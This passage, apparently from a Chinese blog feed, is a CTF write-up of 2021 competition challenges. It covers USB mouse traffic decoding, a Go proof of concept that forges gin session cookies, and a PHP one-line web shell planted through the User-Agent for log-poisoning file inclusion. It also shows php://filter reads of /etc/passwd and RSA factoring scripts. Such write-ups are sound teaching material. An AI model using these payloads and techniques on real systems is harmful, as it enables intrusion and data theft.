class="string">&quot;r&quot;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line.strip()) != <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span>:</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span>:</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>], <span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">0</span>: // <span class="number">1</span>是鼠标左键 <span class="number">2</span>是右键 <span class="number">0</span>是默认</span><br><span class="line">        <span class="built_in">print</span>(posx, posy)</span><br><span class="line">        nums.append((posx, posy))</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure><p>这里注意，可能文章里的格式是 <code>00:00:01:00:00:00:ff:ff</code> 这种，这应该是旧版 tshark获取到的，新版应该都是 <code>00ffff00</code> 格式，上面脚本也是适应这种格式</p><p>7、通过gnuplot绘图 <code>plot usb.txt </code></p><p><img src="/img/2021ycb/image-20210912211320066.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912211320066.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912211320066"></p><p>得到 <code>130，63，111，94，51，134，119，146</code></p><p>然后配合刚开始在一个story文件找到这个 <code>72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108</code></p><p>由于题目提示说开头是<code>GWHT</code>，测试了一下ascii码依次是<code>71，87，72，84</code>，可以得到数字一次减小<code>1、2、3、4....21</code><br>脚本如下得到flag</p><p><img src="/img/2021ycb/image-20210912211453443.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912211453443.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912211453443"></p><p>最后flag:GWHT{W3lCom3_t0_M!sc}，替换头部字符串Sangfor{W3lCom3_t0_M!sc}，提交成功</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x01-Cross-The-Side-等WP补充"><a href="#0x01-Cross-The-Side-等WP补充" class="headerlink" title="0x01 Cross The Side 等WP补充"></a>0x01 Cross The Side 等WP补充</h3><p>版本信息： Laravel8.26.1 / PHP7.4.15</p><p>先尝试一下 Laravel8 CVE-2021-3129<br>不过报了个错，好像是分配的内存不够    </p><p><img src="/img/2021ycb/image-20210912211637351.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912211637351.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912211637351"></p><p>有点迷，<a href="https://tari.moe/2021/06/03/laravel8-debug-rce">以前复现</a>的时候没遇到这两个报错</p><p><img src="/img/2021ycb/image-20210912211643709.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912211643709.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912211643709"></p><p>相关的反序列化好像要找参数接收入口点，不过爆破一下接口暂时没发现。。</p><h3 id="0x02-Checkin-Go"><a href="#0x02-Checkin-Go" class="headerlink" title="0x02 Checkin_Go"></a>0x02 Checkin_Go</h3><p>跑登录hash脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;0a7610&#x27;</span></span><br><span class="line">candidate = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    plaintext = <span class="built_in">str</span>(candidate)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.md5(plaintext.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span>[:<span class="number">6</span>] == target:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;plaintext:&quot;&#x27;</span> + plaintext + <span class="string">&#x27;&quot;, md5:&#x27;</span> + <span class="built_in">hash</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    candidate = candidate + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>帐号密码 tari/tari + 得到的 hash 即可登录，审计源码发现通过checkNowMoney和checkPlayerMoney校验用户的Money和买flag需要的Money，但secret我们不清楚，没法直接伪造。直接base64解码两次，看看Cookie里装的什么东西，其中蓝色的为加密过的内容，即 checkXXX</p><p><img src="/img/2021ycb/image-20210912212202736.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912212202736.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912212202736"></p><p>然后这两个checkXXX，后端校验逻辑为只要能解密内容能解密成功，就行，没有严格校验绑定对应的键是否正常。</p><p><img src="/img/2021ycb/image-20210912212224411.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912212224411.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912212224411"></p><p>但是因base64了两次，直接通过base64 4字节是否对齐替换太麻烦了，直接用gin来替换即可，POC如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randomChar</span><span class="params">(l <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">output := <span class="built_in">make</span>([]<span class="keyword">byte</span>, l)</span><br><span class="line">rand.Read(output)</span><br><span class="line"><span class="keyword">return</span> output</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">storage := cookie.NewStore(randomChar(<span class="number">16</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;o&quot;</span>, storage))</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">s := sessions.Default(c)</span><br><span class="line">s.Set(<span class="string">&quot;uname&quot;</span>, <span class="string">&quot;tari&quot;</span>)</span><br><span class="line">checkPlayerMoney := s.Get(<span class="string">&quot;checkPlayerMoney&quot;</span>)</span><br><span class="line">checflagMoney := s.Get(<span class="string">&quot;checkNowMoney&quot;</span>)</span><br><span class="line"><span class="comment">// 交换 现有的money 和 买 flag money 加密后的值</span></span><br><span class="line">s.Set(<span class="string">&quot;checkNowMoney&quot;</span>, checkPlayerMoney)</span><br><span class="line">s.Set(<span class="string">&quot;checkPlayerMoney&quot;</span>, checflagMoney)</span><br><span class="line">playerMoney := s.Get(<span class="string">&quot;playerMoney&quot;</span>)</span><br><span class="line">flagMoney := s.Get(<span class="string">&quot;nowMoney&quot;</span>)</span><br><span class="line">s.Set(<span class="string">&quot;nowMoney&quot;</span>, playerMoney)</span><br><span class="line">s.Set(<span class="string">&quot;playerMoney&quot;</span>, flagMoney)</span><br><span class="line">s.Save()</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先帐号密码 tari/tari + hash 登录，然后把Cookie提取取来，在本地浏览器替换，访问本地刚刚POC建的HTTP服务即会替换</p><p><img src="/img/2021ycb/image-20210912214117471.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912214117471.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912214117471"></p><p>然后就把Set-Cookie的值替换到比赛环境，访问比赛环境即会看到Money额flag钱对换位置了</p><p><img src="/img/2021ycb/image-20210912214125224.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912214125224.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912214125224"></p><p>在点buyFlag即可得flag</p><p><img src="/img/2021ycb/image-20210912214131580.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912214131580.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912214131580"></p><h3 id="0x03-Only-4"><a href="#0x03-Only-4" class="headerlink" title="0x03 Only 4"></a>0x03 Only 4</h3><p>没成功的思路：</p><p>1、目录爆破得知存在文件 secret.php</p><p>2、伪协议可读/etc/passwd （<code>/?gwht=php://filter/convert.base64-encode/resource=/etc/passwd&amp;ycb=1</code>）但读不了 secret.php</p><p>3、反序列化不是很明白咋利用。。 </p><p>通过下面非预期解命令执行后，发现原来还有个 serialize.php 文件，，我30w字典都没有，kali自带的也没有，辣鸡题目。预期解是，目录爆破得 serialize.php 然后构造POP链，得到 secret.php 然后通过 <code>&gt;</code> 写shell得到flag</p><p>以下应该为非预期解：</p><p>尝试文件包含 /var/log/httpd/access.log access_log error.log error_log 和 /var/log/apache2/access 等等日志文件，均没成功。</p><p>尝试通过伪协议读 /proc，读了 /proc/self/cmdline 和 environ但没啥信息，仔细想想apache既然在运行，肯定还会有相关的文件描述符，按理说，举办方不会ban了这部分的日志才对。通过burp爆破一下 /proc/self/fd/数字</p><p><img src="/img/2021ycb/image-20210912214331899.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912214331899.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912214331899"></p><p>那咋整，，果断向举办放，让他们帮我重置环境。。。</p><p>重新来一次，UA写入<code>&lt;?php @eval($_GET[&#39;c&#39;]); ?&gt;</code></p><p><img src="/img/2021ycb/image-20210912214343059.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912214343059.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912214343059"></p><p>成功，发现flag在根目录下</p><p><img src="/img/2021ycb/image-20210912214352336.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912214352336.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912214352336"></p><h3 id="0x04-Shop-System-等WP补充"><a href="#0x04-Shop-System-等WP补充" class="headerlink" title="0x04 Shop System 等WP补充"></a>0x04 Shop System 等WP补充</h3><p>据说源码是：<a href="https://gitee.com/agoni_no/gulimall">https://gitee.com/agoni_no/gulimall</a></p><p>1、明显是fastjson, @type被禁用，考虑绕过，</p><p>2、通过unicode编码绕过，可以打dnslog</p><p>3、拿到jdk信息-&gt; /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.302.b08-0.el7_9.x86_64/jre</p><p>4、可以拿到报错的调用栈(但是好像没用)</p><p>5、估计版本&gt;=1.2.67</p><h3 id="0x05-NO-SQL-等WP补充"><a href="#0x05-NO-SQL-等WP补充" class="headerlink" title="0x05 NO SQL 等WP补充"></a>0x05 NO SQL 等WP补充</h3><p>1、目录爆破得源码 backup.zip</p><p>2、发现用户Sangfor，重置密码显示 Invalid address: (From): root@localhost</p><p>3、找不到NoSQL注入注入点</p><h3 id="0x06-EasyCurl-等WP补充"><a href="#0x06-EasyCurl-等WP补充" class="headerlink" title="0x06 EasyCurl 等WP补充"></a>0x06 EasyCurl 等WP补充</h3><p>1、访问 /app 敏感信息泄漏，知道登录帐号和密码两个</p><p>2、举办方提示 /common.php.bak </p><p>3、目录爆破发现 admin.php config.php login.php 还有个 log/ 目录里面记录了登录信息</p><p>4、不知道咋触发cache_parser 的魔术函数</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x01-RingRingRing"><a href="#0x01-RingRingRing" class="headerlink" title="0x01 RingRingRing"></a>0x01 RingRingRing</h3><p>一共有两个挑战</p><p>第一个是算出md5符合要求的字符串，直接从1开始爆破</p><p>第二个是计算<code>a**4 + b**4 + c**4 + d**4 == e**2</code></p><p>当abcd相同时，可以转换成</p><p><code>4*a**4==e**2</code></p><p>再进一步转换</p><p><code>e = 2*a*a</code></p><p>最后爆破出100个就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">plain</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(plain.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_1</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># 读题</span></span><br><span class="line">    msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    salt, target = re.findall(<span class="string">r&quot;md5\(str \+ (.*?)\)\[0:5\] \=\= (.*)&quot;</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># 解题</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        result = <span class="built_in">str</span>(i)</span><br><span class="line">        hash_text = md5(result + salt)[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> hash_text == target:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            s.send(result.encode())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_2</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># 读题</span></span><br><span class="line">    msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># 解题</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">        e = <span class="number">2</span> * a * a</span><br><span class="line">        a = <span class="built_in">str</span>(a)</span><br><span class="line">        e = <span class="built_in">str</span>(e)</span><br><span class="line">        msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        s.send(a.encode())</span><br><span class="line">        <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        s.send(a.encode())</span><br><span class="line">        <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        s.send(a.encode())</span><br><span class="line">        <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        s.send(a.encode())</span><br><span class="line">        <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        s.send(e.encode())</span><br><span class="line">        <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;192.168.41.180&quot;</span>, <span class="number">2378</span>))</span><br><span class="line"></span><br><span class="line">challenge_1(s)</span><br><span class="line">challenge_2(s)</span><br><span class="line"></span><br><span class="line">msg = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(msg, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag is: GWHT&#123;a_funny_equation&#125;</span></span><br></pre></td></tr></table></figure><h3 id="0x02-Easy-Rsa"><a href="#0x02-Easy-Rsa" class="headerlink" title="0x02 Easy_Rsa"></a>0x02 Easy_Rsa</h3><p>参考链接：<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</a></p><p>求p,q（python）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="comment"># print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i))</span></span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">    p, q = rho(n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>求m（sage）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p, q = 9983140483800634632426126985832058062766650402234684899412786169759602188949733747138853010482968306554808689182393249326088351886439191015684338347893201, 8437905502983445042677582637893534375137565614989838462475696727313788501904161403475771835934720130340799646782932619714906025013322551788559197469878239</span><br><span class="line"></span><br><span class="line">n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span><br><span class="line">e = 58337</span><br><span class="line">c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>m=764933079065821303936797644844502321236920812448552312502734605833024103591159476785230123313397308075827837</p><p>转换成字符串</p><p>SangFor{0a8c2220-4c1b-32c8-e8c1-adf92ec7678b}</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>好，非常愉快的周末就这样过去了~</p><p>还有几个Web题还是挺好奇咋整的，因此占个坑位..</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox | CrossFit (未完待续)</title>
      <link href="//p/2021/htb-crossfit/"/>
      <url>//p/2021/htb-crossfit/</url>
      
